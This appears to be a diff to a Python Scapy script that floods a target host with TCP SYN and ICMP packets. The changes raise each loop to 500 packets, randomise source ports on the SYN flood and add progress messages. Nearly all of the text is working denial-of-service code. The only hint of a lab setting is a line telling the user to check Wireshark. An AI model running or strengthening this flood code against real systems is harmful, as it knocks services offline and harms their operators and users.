@@ -14,12 +14,17 @@ print(f"[*] Starting attack on {target}")
 # SYN flood - sends many TCP SYN packets
 print("[*] Sending SYN flood...")
 for i in range(100):
-    pkt = IP(dst=target)/TCP(dport=80, flags="S")
+    pkt = [IP(dst=target)/TCP(dport=80, sport=RandShort(),flags="S") 
+           for _ in range (500)]
     send(pkt, verbose=0)
+    print(f"[+] Sent 500 SYN packets to {target}")
     
 print("[*] Sending ICMP flood...")
 for i in range(100):
-    pkt = IP(dst=target)/ICMP()
+    pkt = [IP(dst=target)/ICMP() 
+           for _ in range(500)]
     send(pkt, verbose=0)
+    print(f"[+] Sent 500 ICMP packets to {target}")
+ 
 
 print("[+] Attack complete. Check Wireshark on the network.")
